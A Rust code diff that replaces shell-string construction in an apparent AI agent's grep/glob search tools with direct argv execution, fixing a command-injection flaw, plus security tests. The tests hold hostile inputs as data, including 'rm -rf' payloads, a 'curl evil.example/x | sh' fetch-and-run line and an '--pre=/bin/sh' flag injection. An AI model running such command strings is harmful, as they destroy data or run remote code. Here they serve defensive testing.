@@ -17,7 +17,6 @@
 //!   `terminal/kill`, `terminal/release` — shell execution
 
 use std::collections::HashMap;
-use std::fmt::Write as FmtWrite;
 use std::io::{self, BufRead, Write};
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::Arc;
@@ -1682,41 +1681,193 @@ impl AcpServer {
         self.acp_bash(&ls_args).await
     }
 
-    async fn acp_search(&self, args: &HashMap<String, Value>, tool_name: &str) -> AcpToolResult {
-        // Delegate glob/grep as terminal commands using find/rg
-        let command = match tool_name {
-            "glob" => {
-                let pattern = args.get("pattern").and_then(|v| v.as_str()).unwrap_or("*");
-                let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
-                format!("find {path} -name '{pattern}' -type f 2>/dev/null | head -100")
-            }
-            "grep" => {
-                let pattern = args.get("pattern").and_then(|v| v.as_str()).unwrap_or("");
-                let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
-                let file_type = args.get("type").and_then(|v| v.as_str());
-                let glob = args.get("glob").and_then(|v| v.as_str());
-
-                let mut cmd = "rg --no-heading".to_string();
-                if let Some(ft) = file_type {
-                    let _ = write!(cmd, " --type {ft}");
-                }
-                if let Some(g) = glob {
-                    let _ = write!(cmd, " --glob '{g}'");
-                }
-                let _ = write!(cmd, " '{pattern}' {path} 2>/dev/null | head -200");
-                cmd
-            }
-            _ => {
+    async fn acp_search(
+        &self,
+        tool_args: &HashMap<String, Value>,
+        tool_name: &str,
+    ) -> AcpToolResult {
+        // SECURITY (#688): user-/model-supplied search arguments must NEVER be
+        // interpolated into a shell command. Build an argv vector and execute
+        // the resolved binary directly via `Command`, bypassing the ACP
+        // `terminal/create` shell entirely. Metacharacters become literal
+        // argv entries; `--` blocks flag injection from the pattern/path.
+        let (program, argv) = match build_search_argv(tool_name, tool_args) {
+            Ok(plan) => plan,
+            Err(err) => {
                 return AcpToolResult {
-                    content: format!("Unknown search tool: {tool_name}"),
+                    content: err,
                     is_error: true,
-                }
+                };
             }
         };
 
-        let mut bash_args = HashMap::new();
-        bash_args.insert("command".to_string(), Value::String(command));
-        self.acp_bash(&bash_args).await
+        run_search_argv(&program, &argv).await
+    }
+}
+
+/// Output cap for search subprocesses (bytes). Replaces the previous
+/// `| head -N` pipeline, which only worked because the command was being
+/// shell-interpreted.
+const SEARCH_OUTPUT_CAP_BYTES: usize = 256 * 1024;
+
+/// Resolve a program name to an absolute path by walking `PATH`.
+///
+/// Returns `None` if the binary is not found or the entry is not executable.
+/// Equivalent to `which`, but avoids adding a dependency. Always returns an
+/// absolute path so the caller invokes a known binary instead of relying on
+/// `Command::new`'s implicit lookup (which still works, but is harder to
+/// audit and to exercise in tests).
+fn resolve_program(name: &str) -> Option<std::path::PathBuf> {
+    // Reject obviously path-like or unsafe names — search tools are bare
+    // executable names (`rg`, `find`), not paths.
+    if name.is_empty() || name.contains(std::path::MAIN_SEPARATOR) || name.contains('/') {
+        return None;
+    }
+    let path_var = std::env::var_os("PATH")?;
+    for entry in std::env::split_paths(&path_var) {
+        if entry.as_os_str().is_empty() {
+            continue;
+        }
+        let candidate = entry.join(name);
+        if let Ok(meta) = std::fs::metadata(&candidate) {
+            if meta.is_file() {
+                #[cfg(unix)]
+                {
+                    use std::os::unix::fs::PermissionsExt;
+                    if meta.permissions().mode() & 0o111 != 0 {
+                        return Some(candidate);
+                    }
+                }
+                #[cfg(not(unix))]
+                {
+                    return Some(candidate);
+                }
+            }
+        }
+    }
+    None
+}
+
+/// Pure planner: turn a search tool invocation into an absolute program path
+/// plus argv. No shell, no interpolation. Returns `Err` with a
+/// human-readable reason when the tool name is unknown or the binary cannot
+/// be located on `PATH`.
+fn build_search_argv(
+    tool_name: &str,
+    tool_args: &HashMap<String, Value>,
+) -> Result<(std::path::PathBuf, Vec<String>), String> {
+    match tool_name {
+        "glob" => {
+            let pattern = tool_args
+                .get("pattern")
+                .and_then(|v| v.as_str())
+                .unwrap_or("*")
+                .to_string();
+            let path = tool_args
+                .get("path")
+                .and_then(|v| v.as_str())
+                .unwrap_or(".")
+                .to_string();
+            let program = resolve_program("find")
+                .ok_or_else(|| "Could not locate `find` on PATH".to_string())?;
+            // `find <path> -type f -name <pattern>` — `<path>` comes BEFORE
+            // any `-flag` so it cannot be mistaken for an option. The
+            // `-name`/`-type` flags are hard-coded; only `<pattern>` and
+            // `<path>` are user-controlled, and both arrive as argv entries.
+            let argv = vec![
+                path,
+                "-type".to_string(),
+                "f".to_string(),
+                "-name".to_string(),
+                pattern,
+            ];
+            Ok((program, argv))
+        }
+        "grep" => {
+            let pattern = tool_args
+                .get("pattern")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let path = tool_args
+                .get("path")
+                .and_then(|v| v.as_str())
+                .unwrap_or(".")
+                .to_string();
+            let program = resolve_program("rg")
+                .ok_or_else(|| "Could not locate `rg` on PATH".to_string())?;
+
+            let mut argv: Vec<String> = vec!["--no-heading".to_string()];
+            if let Some(ft) = tool_args.get("type").and_then(|v| v.as_str()) {
+                // The type name itself is an argv entry, but disallow values
+                // that look like flags to keep the contract obvious.
+                if ft.starts_with('-') {
+                    return Err(format!("Invalid `type` value (looks like a flag): {ft}"));
+                }
+                argv.push("--type".to_string());
+                argv.push(ft.to_string());
+            }
+            if let Some(g) = tool_args.get("glob").and_then(|v| v.as_str()) {
+                if g.starts_with('-') {
+                    return Err(format!("Invalid `glob` value (looks like a flag): {g}"));
+                }
+                argv.push("--glob".to_string());
+                argv.push(g.to_string());
+            }
+            // `--` terminator: everything after this is positional, so a
+            // pattern like `-foo` or `--help` is treated as the search
+            // pattern, not an rg option. This is the flag-injection block.
+            argv.push("--".to_string());
+            argv.push(pattern);
+            argv.push(path);
+            Ok((program, argv))
+        }
+        other => Err(format!("Unknown search tool: {other}")),
+    }
+}
+
+/// Execute the resolved program with the planned argv and return a result
+/// suitable for an ACP tool reply. Output is byte-capped (replacing the
+/// former `| head -N` shell pipeline) and stdout+stderr are merged in the
+/// natural order Tokio gives us.
+async fn run_search_argv(program: &std::path::Path, argv: &[String]) -> AcpToolResult {
+    let output = match tokio::process::Command::new(program)
+        .args(argv)
+        .output()
+        .await
+    {
+        Ok(out) => out,
+        Err(e) => {
+            return AcpToolResult {
+                content: format!("Failed to spawn {}: {e}", program.display()),
+                is_error: true,
+            };
+        }
+    };
+
+    let mut combined = String::from_utf8_lossy(&output.stdout).into_owned();
+    if !output.stderr.is_empty() {
+        // Surface stderr (rg prints "No files were searched" etc. there)
+        // but only when present, so happy paths stay clean.
+        combined.push_str(&String::from_utf8_lossy(&output.stderr));
+    }
+    if combined.len() > SEARCH_OUTPUT_CAP_BYTES {
+        combined.truncate(SEARCH_OUTPUT_CAP_BYTES);
+        combined.push_str("\n[output truncated]");
+    }
+
+    let exit_code = output.status.code().unwrap_or(-1);
+    let content = if combined.is_empty() {
+        format!("(exit code {exit_code})")
+    } else {
+        format!("{combined}\n(exit code {exit_code})")
+    };
+    AcpToolResult {
+        content,
+        // `rg` exits non-zero when there are no matches — that's not a tool
+        // error, just an empty result. Treat exit codes 0 and 1 from rg as
+        // success; anything else is a real failure.
+        is_error: !(exit_code == 0 || exit_code == 1),
     }
 }
 
@@ -1949,5 +2100,165 @@ mod ide_tests {
         assert!(state.active_file.is_none());
         assert!(state.selection.is_none());
         assert!(state.diagnostics.is_empty());
+    }
+}
+
+// ============================================================================
+// Security tests for #688 — acp_search must NEVER shell-interpolate user input
+// ============================================================================
+
+#[cfg(test)]
+mod search_security_tests {
+    use super::{build_search_argv, resolve_program};
+    use serde_json::Value;
+    use std::collections::HashMap;
+
+    fn args_from(pairs: &[(&str, &str)]) -> HashMap<String, Value> {
+        pairs
+            .iter()
+            .map(|(k, v)| ((*k).to_string(), Value::String((*v).to_string())))
+            .collect()
+    }
+
+    /// Shell metacharacters in the grep pattern become a single argv entry —
+    /// they are NOT parsed by a shell, so `;`, `$(...)`, backticks, and `&&`
+    /// are matched literally instead of executing arbitrary commands.
+    #[test]
+    fn grep_shell_metacharacters_in_pattern_are_literal_argv() {
+        let cases = [
+            "; rm -rf ~ ;",
+            "$(rm -rf /)",
+            "`id`",
+            "foo && curl evil.example/x | sh",
+            "' ; touch /tmp/pwn ; '",
+        ];
+        for raw in cases {
+            let tool_args = args_from(&[("pattern", raw), ("path", ".")]);
+            // Skip the test if `rg` is not installed in the sandbox.
+            let Ok((program, argv)) = build_search_argv("grep", &tool_args) else {
+                eprintln!("skipping: rg not on PATH");
+                return;
+            };
+
+            // Whole argv must be exactly the fixed prefix + the literal
+            // pattern + the literal path, with no concatenation.
+            assert_eq!(
+                argv,
+                vec![
+                    "--no-heading".to_string(),
+                    "--".to_string(),
+                    raw.to_string(),
+                    ".".to_string(),
+                ],
+                "metacharacters were not preserved as a single argv entry"
+            );
+            // No element of argv may contain a shell-pipe / redirect
+            // construct that the original code built (`2>/dev/null`,
+            // `| head`). Those were the smoking gun of shell interpolation.
+            for entry in &argv {
+                assert!(
+                    !entry.contains("2>/dev/null"),
+                    "argv leaked a shell-redirect token: {entry}"
+                );
+                assert!(
+                    !entry.contains("| head"),
+                    "argv leaked a shell-pipe token: {entry}"
+                );
+            }
+            // Program is an absolute, resolved path — not a bare name.
+            assert!(
+                program.is_absolute(),
+                "program path is not absolute: {}",
+                program.display()
+            );
+        }
+    }
+
+    /// Glob tool: a malicious pattern containing closing quotes / command
+    /// substitution must NOT escape into a `find` shell pipeline. The
+    /// argv-based plan passes it straight to `-name`.
+    #[test]
+    fn glob_injection_pattern_is_literal_name_arg() {
+        let evil = "' ; rm -rf ~ ; '";
+        let tool_args = args_from(&[("pattern", evil), ("path", ".")]);
+        let Ok((program, argv)) = build_search_argv("glob", &tool_args) else {
+            eprintln!("skipping: find not on PATH");
+            return;
+        };
+        assert_eq!(
+            argv,
+            vec![
+                ".".to_string(),
+                "-type".to_string(),
+                "f".to_string(),
+                "-name".to_string(),
+                evil.to_string(),
+            ]
+        );
+        for entry in &argv {
+            assert!(
+                !entry.contains("2>/dev/null") && !entry.contains('|'),
+                "argv leaked shell metacharacters: {entry}"
+            );
+        }
+        assert!(program.is_absolute());
+    }
+
+    /// `rg` is resolved to an absolute path via PATH lookup, not invoked by
+    /// bare name. This ensures the binary actually executed is the one a
+    /// reviewer can audit, and matches the test contract from #688.
+    #[test]
+    fn resolved_rg_program_is_absolute_path() {
+        let Some(rg) = resolve_program("rg") else {
+            eprintln!("skipping: rg not on PATH");
+            return;
+        };
+        assert!(rg.is_absolute(), "rg path not absolute: {}", rg.display());
+        assert_eq!(
+            rg.file_name().and_then(|s| s.to_str()),
+            Some("rg"),
+            "resolved program is not `rg`: {}",
+            rg.display()
+        );
+        // resolve_program rejects path-like names to prevent traversal.
+        assert!(resolve_program("/etc/passwd").is_none());
+        assert!(resolve_program("../evil").is_none());
+        assert!(resolve_program("").is_none());
+    }
+
+    /// A pattern that begins with `-` (e.g. `--help`, `-A`, `--pre=`) must
+    /// be passed AFTER the `--` argv terminator, so `rg` treats it as
+    /// the search pattern instead of a flag. This blocks flag injection
+    /// even when the attacker controls the pattern.
+    #[test]
+    fn grep_flag_injection_blocked_by_double_dash_terminator() {
+        let attacker_patterns = ["--help", "-files-with-matches", "-A1000000", "--pre=/bin/sh"];
+        for pat in attacker_patterns {
+            let tool_args = args_from(&[("pattern", pat), ("path", ".")]);
+            let Ok((_, argv)) = build_search_argv("grep", &tool_args) else {
+                eprintln!("skipping: rg not on PATH");
+                return;
+            };
+            let dash_idx = argv
+                .iter()
+                .position(|s| s == "--")
+                .expect("argv missing `--` terminator");
+            let pat_idx = argv
+                .iter()
+                .position(|s| s == pat)
+                .expect("argv missing the user-supplied pattern");
+            assert!(
+                pat_idx > dash_idx,
+                "user-supplied pattern `{pat}` appeared before `--`; flag injection is NOT blocked"
+            );
+        }
+
+        // Direct flag injection via the `type` and `glob` arguments is
+        // refused at planning time — they would otherwise become their own
+        // argv entries and could still be flags.
+        let tool_args = args_from(&[("pattern", "x"), ("type", "--evil")]);
+        assert!(build_search_argv("grep", &tool_args).is_err());
+        let tool_args = args_from(&[("pattern", "x"), ("glob", "-rf")]);
+        assert!(build_search_argv("grep", &tool_args).is_err());
     }
 }
